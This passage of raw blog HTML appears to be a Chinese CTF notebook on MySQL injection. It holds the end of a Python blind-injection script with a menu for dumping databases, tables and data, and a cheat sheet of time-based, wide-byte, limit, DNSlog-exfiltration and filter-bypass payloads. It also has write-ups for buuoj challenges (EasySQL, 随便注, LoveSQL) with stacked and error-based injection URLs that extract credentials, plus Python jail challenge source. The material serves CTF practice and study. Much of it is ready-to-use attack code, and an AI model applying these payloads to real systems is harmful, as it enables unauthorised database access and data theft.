   name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">            hexchar = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">                hexchar = str2hex(name + <span class="built_in">chr</span>(char))</span><br><span class="line">                payloads = payload.<span class="built_in">format</span>(hexchar)</span><br><span class="line">                <span class="comment">#print(payloads)</span></span><br><span class="line">                urls = url + payloads</span><br><span class="line">                r = requests.get(url=urls)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    name += <span class="built_in">chr</span>(char-<span class="number">1</span>)</span><br><span class="line">                    <span class="built_in">print</span>(name)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请输入要操作的内容：\n1.爆当前数据库\n2.爆数据表开始行号\n3.爆数据表\n4.爆字段值开始行号\n5.爆字段值\n6.爆数据\n7.爆所有数据库&quot;</span>)</span><br><span class="line">        types = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">        <span class="keyword">if</span> types == <span class="number">1</span>:</span><br><span class="line">            current_db(url)</span><br><span class="line">        <span class="keyword">elif</span> types == <span class="number">2</span> <span class="keyword">or</span> types == <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;请输入已经得到的数据库名:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            database = <span class="built_in">input</span>()</span><br><span class="line">            <span class="keyword">if</span> types == <span class="number">2</span>:</span><br><span class="line">                tables_n(url,database)</span><br><span class="line">            <span class="keyword">elif</span> types == <span class="number">3</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;爆数据表开始行号:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">                tables(url,database,n)</span><br><span class="line">        <span class="keyword">elif</span> types == <span class="number">4</span> <span class="keyword">or</span> types == <span class="number">5</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;请输入已经得到的数据库名:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            database = <span class="built_in">input</span>()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;请输入已经得到的数据表名:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            table = <span class="built_in">input</span>()</span><br><span class="line">            <span class="keyword">if</span> types == <span class="number">4</span>:</span><br><span class="line">                columns_n(url,database,table)</span><br><span class="line">            <span class="keyword">elif</span> types == <span class="number">5</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;爆字段值开始行号:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">                columns(url,database,table,n)</span><br><span class="line">        <span class="keyword">elif</span> types == <span class="number">6</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;请输入要查询的数据表名:&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            table = <span class="built_in">input</span>()</span><br><span class="line">            datas(url,table)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            dbs(url)</span><br></pre></td></tr></table></figure>
<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p>原理都会，不讲了。</p>
<p>ascii判断:<code>if(ascii(substr(查询语句,1,1))&gt;115,1,sleep(3))</code><br>left语句判断:<code>if(left(查询语句,1)=&#39;s&#39;,sleep(10),1)</code><br>             <code>if(left(查询语句,2)=&#39;sa&#39;,sleep(10),1)</code><br>substring函数判断:<code>if(substring((查询语句),1,1=&#39;a&#39;),11111,sleep(1))</code></p>
<h1 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h1><p>同时间盲注，没啥东西</p>
<h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><p>也没啥太多活能整，可以使用flask框架本地中转一下，把繁琐的步骤交给机器做。</p>
<h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>能同时执行多条语句，要求比较高，这时候可以使用预编译了。<br>可以参考这题整花活**[强网杯 2019]随便注**<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44657899/article/details/103239145">BUUCTF[强网杯 2019]随便注 的三种解法</a></p>
<h1 id="Dnslog注入"><a href="#Dnslog注入" class="headerlink" title="Dnslog注入"></a>Dnslog注入</h1><p>要求mysql权限比较高，同时还得能出网<br>公式:<code>select load_file(concat(&#39;\\&#39;,(查询语句),&#39;.DNSLOG给的域名/任意字符&#39;</code></p>
<h1 id="搜索注入"><a href="#搜索注入" class="headerlink" title="搜索注入"></a>搜索注入</h1><p>原理:mysql查询的时候，常用的是<code>select * from sqltest where names like &#39;%要查询的关键字%</code><br>这时候就可以闭合<code>%</code>然后注入</p>
<h1 id="宽字节注入-使用了addslashes-函数-amp-amp-数据库设置了编码模式为GBK"><a href="#宽字节注入-使用了addslashes-函数-amp-amp-数据库设置了编码模式为GBK" class="headerlink" title="宽字节注入 |使用了addslashes()函数 &amp;&amp; 数据库设置了编码模式为GBK"></a>宽字节注入 |使用了addslashes()函数 &amp;&amp; 数据库设置了编码模式为GBK</h1><p>原理: 前端输入%df时，首先经过addslashes()转义变成%df%5c%27，之后，在数据库查询前，因为设置了GBK编码，GBK编码在汉字编码范围内的两个字节都会重新编码成一个汉字。然后mysql服务器会对查询的语句进行GBK编码，%df%5c编码成了“运”，而单引号逃逸了出来，形成了注入漏洞。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=%df&#x27; and 1=1 --+</span><br><span class="line"></span><br><span class="line">?id=%df&#x27; and 1=2 --+</span><br><span class="line"></span><br><span class="line">?id=-1%df&#x27; union select 1,2,3 %23</span><br></pre></td></tr></table></figure>
<h1 id="limit注入-数据库版本比较低"><a href="#limit注入-数据库版本比较低" class="headerlink" title="limit注入 | 数据库版本比较低"></a>limit注入 | 数据库版本比较低</h1><p>原理:<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">Mysql下Limit注入方法</a><br>公式:<code>SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,查询语句)),1); </code></p>
<h1 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h1><h2 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h2><p>两个空格代替一个空格，用Tab代替空格，%a0&#x3D;空格,括号代替空格,注释<code>/*注释*/</code></p>
<h2 id="引号-十六进制"><a href="#引号-十六进制" class="headerlink" title="引号 | 十六进制"></a>引号 | 十六进制</h2><p>这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。<code>users</code>的<strong>十六进制</strong>的字符串是<code>7573657273</code>。那么最后的sql语句就变为了：</p>
<p>select column_name from information_schema.tables where table_name&#x3D;<code>0x7573657273</code></p>
<h2 id="逗号"><a href="#逗号" class="headerlink" title="逗号"></a>逗号</h2><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：</p>
<p><code>select substr(database() from 1 for 1);</code></p>
<p><code>select mid(database() from 1 for 1);</code></p>
<p>使用join：</p>
<p><code>union select 1,2#</code></p>
<p>等价于 <code>union select * from (select 1)a join (select 2)b</code></p>
<p>使用like:</p>
<p><code>select ascii(mid(user(),1,1))=80 #</code></p>
<p>等价于 <code>select user() like &#39;r%&#39;</code></p>
<p>对于limit可以使用offset来绕过：</p>
<p><code>select * from news limit 0,1 #</code></p>
<p>等价于下面这条SQL语句<code> select * from news limit 1 offset 0</code></p>
<h2 id="绕过比较符号"><a href="#绕过比较符号" class="headerlink" title="绕过比较符号()"></a>绕过比较符号()</h2><p>（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）：</p>
<p>使用greatest()、least（）：（前者返回最大值，后者返回最小值）</p>
<p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。 最常见的一个盲注的sql语句：</p>
<p><code>select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</code></p>
<p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。 那么上面的这条sql语句可以使用greatest变为如下的子句:</p>
<p><code>select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</code></p>
<h2 id="Between注入"><a href="#Between注入" class="headerlink" title="Between注入"></a>Between注入</h2><p>主要用于盲注看页面是否有变化，原理如下，例如username的字符内容是test1，第一个字符是t，a到b搜索不了，页面不正常。 a到t就有了，页面正常</p>
<p>注<code>between 1 and 1;</code> 等价于 &#x3D;1</p>
<h2 id="WHERE"><a href="#WHERE" class="headerlink" title="WHERE"></a>WHERE</h2><p>可以使用having ,但是<code>having</code>只能用前面<code>select</code>已经选择的列名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select goods_price,goods_name from sw_goods where goods_price &gt; 100</span><br><span class="line">select goods_price,goods_name from sw_goods having goods_price &gt; 100</span><br></pre></td></tr></table></figure>
<h2 id="过滤information-schema"><a href="#过滤information-schema" class="headerlink" title="过滤information_schema"></a>过滤information_schema</h2><p>可以查表名:</p>
<ol>
<li>InnoDb引擎<br>从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。只需要把<code>infromation_schema</code>换成<code>mysql.innodb_table_stats</code></li>
<li>sys数据库<br>在5.7以上的MYSQL中，新增了sys数据库，该库的基础数据来自information_schema和performance_chema，其本身不存储数据。可以通过其中的schema_auto_increment_columns来获取表名。只需要把<code>information_schema</code>换成<code>sys.schema_auto_increment_columns</code>就行了，其他的完全一样</li>
</ol>
<p>之后就需要无列名注入了</p>
<h2 id="SLEEP"><a href="#SLEEP" class="headerlink" title="SLEEP"></a>SLEEP</h2><p>睡不了？就想办法让sql干重活慢下来<br><code>concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;</code></p>
<h2 id="or-and-xor-not绕过："><a href="#or-and-xor-not绕过：" class="headerlink" title="or and xor not绕过："></a>or and xor not绕过：</h2><p><code>and=&amp;&amp;</code> <code>or=||</code> <code>xor=|</code> <code>not=!</code></p>
<h2 id="绕过注释符"><a href="#绕过注释符" class="headerlink" title="绕过注释符"></a>绕过注释符</h2><p>（#，–(后面跟一个空格））过滤：</p>
<p><code>id=1&#39; union select 1,2,3||&#39;1</code></p>
<p>最后的or ‘1闭合查询语句的最后的单引号，或者：</p>
<p><code>id=1&#39; union select 1,2,&#39;3</code></p>
<h2 id="绕过等于号"><a href="#绕过等于号" class="headerlink" title="绕过等于号"></a>绕过等于号</h2><p>使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</p>
<h2 id="其他的bypass手段"><a href="#其他的bypass手段" class="headerlink" title="其他的bypass手段:"></a>其他的bypass手段:</h2><p>这个就看题目环境了，题目里随机多样，但是万变不离其宗。</p>
<h1 id="Sqlmap科技"><a href="#Sqlmap科技" class="headerlink" title="Sqlmap科技"></a>Sqlmap科技</h1><p>未完待续</p>
<h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接:"></a>相关链接:</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-qing-/p/11610385.html#lab3">Sqli通关</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/79847375">flask框架</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9849">exp函数溢出注入</a><br><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2019/03/25/MySQL%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/">MySQL注入指北</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html">group_by注入</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_53065491/article/details/121893986">group_by报错注入</a><br><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2018/06/18/MySQL%E7%9A%84BIGINT%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">BIGINT报错注入</a><br><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2018/04/07/SQL%E6%B3%A8%E5%85%A5%E5%85%B3%E8%81%94%E5%88%86%E6%9E%90-WooYun/#x00-%E5%BA%8F">SQL注入关联分析</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/231627">浅谈利用mysql8新特性进行SQL注入</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46330722/article/details/109605941?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-109605941-blog-117067799.pc_relevant_vip_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-109605941-blog-117067799.pc_relevant_vip_default&utm_relevant_index=2">SQL注入之无列名注入</a></p>
</div><div class="index-category-tag">  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted index-tags" href="/tags/SQL/">SQL</a></div><hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2022-10-12  <a class="commentCountImg" href="/2022/10/12/HNctf/#comment-container"><span class="display-none-class">d41d8cd98f00b204e9800998ecf8427e</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="d41d8cd98f00b204e9800998ecf8427e">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>2 分钟  <i class="fas fa-pencil-alt"> </i>0.2 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/10/12/HNctf/"> </a></h1><div class="content"><h1 id="Week1-calc-jail-beginner-level2-5-JAIL"><a href="#Week1-calc-jail-beginner-level2-5-JAIL" class="headerlink" title="[Week1]calc_jail_beginner_level2.5(JAIL)"></a>[Week1]calc_jail_beginner_level2.5(JAIL)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#the length is be limited less than 13</span></span><br><span class="line"><span class="comment">#it seems banned some payload </span></span><br><span class="line"><span class="comment">#banned some unintend sol</span></span><br><span class="line"><span class="comment">#Can u escape it?Good luck!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">s</span>):</span><br><span class="line">    BLACKLIST = [<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;input&quot;</span>,<span class="string">&quot;eval&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> BLACKLIST:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> s:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i!r&#125;</span> has been banned for security reasons&#x27;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _ _                _ ___    _____ </span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | |              | |__ \  | ____|</span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| |  ) | | |__  </span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | |/ _ \ \ / / _ \ | / /  |___ \ </span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |/ /_ _ ___) |</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____(_)____/ </span></span><br><span class="line"><span class="string">              __/ |                          _/ |                                          </span></span><br><span class="line"><span class="string">             |___/                          |__/                                                                                                            </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="built_in">filter</span>(input_data)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(input_data)&gt;<span class="number">13</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Unicode 欺骗<br><code>https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#%E6%9E%81%E7%AB%AF%E9%99%90%E5%88%B6</code><br>好棒的博客</p>
<h1 id="WEEK2-calc-jail-beginner-level5-JAIL"><a href="#WEEK2-calc-jail-beginner-level5-JAIL" class="headerlink" title="[WEEK2]calc_jail_beginner_level5(JAIL)"></a>[WEEK2]calc_jail_beginner_level5(JAIL)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#It\&#x27;s an challenge for jaillevel5 let\&#x27;s read your flag!\nimport load_flag\n\nflag = load_flag.get_flag()\n\ndef main():\n    WELCOME = \&#x27;\&#x27;\&#x27;\n  _                _                           _       _ _ _                _ _____ \n | |              (_)                         (_)     (_) | |              | | ____|\n | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| | |__  \n | \&#x27;_ \\ / _ \\/ _` | | \&#x27;_ \\| \&#x27;_ \\ / _ \\ \&#x27;__|   | |/ _` | | | |/ _ \\ \\ / / _ \\ |___ \\ \n | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\\ V /  __/ |___) |\n |_.__/ \\___|\\__, |_|_| |_|_| |_|\\___|_|      | |\\__,_|_|_|_|\\___| \\_/ \\___|_|____/ \n              __/ |                          _/ |                                   \n             |___/                          |__/                                                                                                                                                                     \n\&#x27;\&#x27;\&#x27;\n    print(WELCOME)\n    print(&quot;It\&#x27;s so easy challenge!&quot;)\n    print(&quot;Seems flag into the dir()&quot;)\n    repl()\n\n\ndef repl():\n    my_global_dict = dict()\n    my_global_dict[\&#x27;my_flag\&#x27;] = flag\n    input_code = input(&quot;&gt; &quot;)\n    complie_code = compile(input_code, \&#x27;&lt;string&gt;\&#x27;, \&#x27;single\&#x27;)\n    exec(complie_code, my_global_dict)\n\nif __name__ == \&#x27;__main__\&#x27;:\n    main()</span><br></pre></td></tr></table></figure></div><div class="index-category-tag">  <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2022-10-10  <a class="commentCountImg" href="/2022/10/10/%E5%81%9A%E9%A2%98%E5%AF%84%E5%BD%95/#comment-container"><span class="display-none-class">8df068351002c6067f9baecf3268bc66</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="8df068351002c6067f9baecf3268bc66">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>6 分钟  <i class="fas fa-pencil-alt"> </i>0.9 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/10/10/%E5%81%9A%E9%A2%98%E5%AF%84%E5%BD%95/">BUU做题寄录</a></h1><div class="content"><h1 id="suctf-2019-EasySQL-sql-mode"><a href="#suctf-2019-EasySQL-sql-mode" class="headerlink" title="[suctf 2019]EasySQL | sql_mode"></a>[suctf 2019]EasySQL | sql_mode</h1><p>sql 注入</p>
<p>乍一试，可以堆叠<br><img src="/images/ji/1.png"></p>
<p><img src="/images/ji/2.png"><br>看样子有过滤,简单测了一下，过滤了<code>from</code>,<code>information</code></p>
<p>黑名单</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$BlackList</span> = <span class="string">&quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>查询语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select $_GET[&#x27;query&#x27;] || flag from flag</span><br></pre></td></tr></table></figure>

<h2 id="脑洞"><a href="#脑洞" class="headerlink" title="脑洞:"></a>脑洞:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload1: *,1</span><br><span class="line">payload2: 0;set sql_mode=PIPES_AS_CONCAT;select 0</span><br><span class="line"></span><br><span class="line">让sql把 || 当作拼接</span><br></pre></td></tr></table></figure>

<h1 id="强网杯-2019-随便注-堆叠，无select-预编译"><a href="#强网杯-2019-随便注-堆叠，无select-预编译" class="headerlink" title="[强网杯 2019]随便注 | 堆叠，无select 预编译"></a>[强网杯 2019]随便注 | 堆叠，无select 预编译</h1><p>上来就把黑名单一摆，好像已经无懈可击了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>

<p>测试一下，字符形 双引号<br><img src="/iamges/ji/3.png"><br>emmm,啥都不会了，只能看看<code>wp</code>了</p>
<p>mysql里面，爆字段并不一定需要<code>information_schema</code>这个库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show columns from users;</span><br><span class="line">+----------+-------------+------+-----+---------+----------------+</span><br><span class="line">| Field    | Type        | Null | Key | Default | Extra          |</span><br><span class="line">+----------+-------------+------+-----+---------+----------------+</span><br><span class="line">| id       | int(3)      | NO   | PRI | NULL    | auto_increment |</span><br><span class="line">| username | varchar(20) | NO   |     | NULL    |                |</span><br><span class="line">| password | varchar(20) | NO   |     | NULL    |                |</span><br><span class="line">+----------+-------------+------+-----+---------+----------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="/iamges/ji/4.png"></p>
<p>嗯哼~<br><strong>how 命令查看表中的「字段」，注意表名要用反引号包裹</strong><br><a href="%22https://blog.csdn.net/qq_44657899/article/details/103239145%22">有用</a></p>
<p>附: MySQL专有无select可用<br>MySQL 除了可以使用 select 查询表中的数据，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler 语句并不具备 select 语句的所有功能。它是 MySQL 专用的语句，并没有包含到SQL标准中。handler 语句提供通往表的直接通道的存储引擎接口，可以用于 MyISAM 和 InnoDB 表。</p>
<p>也可以使用预编译转换成hex绕过</p>
<h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><p>喜提fuzz脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">url = &quot;http://7e692c90-6f0b-4aa3-babf-89bb436f6b4f.node4.buuoj.cn:81/&quot;</span><br><span class="line">with open(&#x27;sql-fuzz.txt&#x27;) as f:</span><br><span class="line">    for line in f:</span><br><span class="line">        data = &#123;&quot;query&quot;: line&#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        if(&#x27;Nonono&#x27; in r.text):</span><br><span class="line">            print(line.strip(),end=&quot; &quot;)</span><br></pre></td></tr></table></figure>

<p>纯盲注了，啥都看不见，但是我感觉这题的画风是那么的似曾相识…..</p>
<p><code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p>
<p>淦，上一题一模一样的<code>payload</code></p>
<h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><p>报错注入</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://0271ebd9-169b-4d78-8475-f6667e20789c.node4.buuoj.cn:81/check.php?username=admin&#39;">http://0271ebd9-169b-4d78-8475-f6667e20789c.node4.buuoj.cn:81/check.php?username=admin&#39;</a> and updatexml(0x7e,concat(0x7e,database()),0x7e) %23&amp;password&#x3D;admin’ and sleep(3)</p>
</blockquote>
<p><img src="/iamges/ji/5.png"></p>
<p>表名:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">geekuser: id,username,password   geek库</span><br><span class="line">l0ve1ysq1: id,username,password  geek库</span><br></pre></td></tr></table></figure>

<p>admin<br>824fc00cd6f8cd94403b365a80bcfbd</p>
<p>cl4y<br>wo_tai_nan_le</p>
<p>glzjin<br>glzjin_wants_a_girlfriend</p>
<p>Z4cHAr7zCr<br>biao_ge_dddd_hm</p>
<p>报错注入，硬爆</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://0271ebd9-169b-4d78-8475-f6667e20789c.node4.buuoj.cn:81/check.php</span><br><span class="line">?username=admin&#x27; and updatexml(1,concat(0x7e,(select substr((select password from l0ve1ysq1 where username=&#x27;flag&#x27;),30,16)),0x7e),1) %23</span><br><span class="line">&amp;password=admin&#x27; and sleep(3)</span><br></pre></td></tr></table></figure>

<h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><p>一眼丁真<code>ffifdyop</code></p>
<p>绕过中一个奇妙的字符串</p>
